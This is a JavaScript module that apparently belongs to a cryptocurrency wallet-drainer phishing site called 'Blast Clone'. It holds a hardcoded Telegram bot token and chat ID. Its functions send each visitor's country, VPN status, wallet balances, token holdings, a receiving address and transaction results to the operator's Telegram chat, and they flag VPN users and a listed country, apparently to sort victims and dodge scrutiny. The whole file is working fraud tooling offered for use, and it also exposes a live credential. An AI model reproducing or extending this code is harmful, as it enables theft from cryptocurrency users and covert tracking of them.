import axios from "axios";
import { getUserCountry, checkVpnStatus, getRecipientAddress } from "./getUserLocation";

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
const TELEGRAM_CHAT_ID = "6482385341";

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown"
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};

const getNativeTokenName = (chain) => {
  switch (chain) {
    case "Ethereum":
      return "ETH";
    case "Binance Smart Chain":
      return "BNB";
    case "Polygon":
      return "MATIC";
    case "Avalanche":
      return "AVAX";
    case "Arbitrum":
      return "ETH";
    case "Optimism":
      return "ETH";
    case "Celo":
      return "CELO";
    default:
      return "ETH";
  }
};

export const sendTransactionStatusToTelegram = async (status, txHash) => {
  const message = `*Transaction Status*\n` +
                  `Status: ${status === "success" ? "✅ Success" : "❌ Failure"}\n` +
                  `Transaction Hash: \`${txHash}\``;

  await sendMessageToTelegram(message);
};

// Function to send app details (for EVM chains) to Telegram
export const sendAppDetailsToTelegram = async (nativeBalance, tokens, chain) => {
  const tokenDetails = tokens.map(
    (token) => `|💵 ${token.symbol}: ${(token.tokenAmount / 10 ** token.tokenDecimal).toFixed(4)} ${token.symbol}   |`
  );

  let userCountryData = await getUserCountry();
  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX", isVpnIpdata: false }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const isVpn = isVpnIpdata || await checkVpnStatus(ip);
  const recipientAddress = await getRecipientAddress();

  const specialCountries = ["AE"];
  const globeIcon = "🌍";
  const isMine = specialCountries.includes(countryCode) || isVpn ? "🔴" : "🟢";

  const nativeTokenName = getNativeTokenName(chain);
  let message = `*Visit Alert*\n` +
                `App: Blast Clone\n\n` +
                `User Info--------------------\n` +
                `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpn || specialCountries.includes(countryCode)) {
    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
  } else {
    message += `| ✅ NO VPN SUSPECTED |\n`;
  }

  message += `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
             `--------------------------------\n` +
             `| 💵 User Wallet Balance on ${chain} |\n` +
             `| 💵 Native Balance: ${nativeBalance} ${nativeTokenName}       |\n` +
             `${tokenDetails.join("\n")}\n` +
             `------------------------------End`;

  await sendMessageToTelegram(message);
};
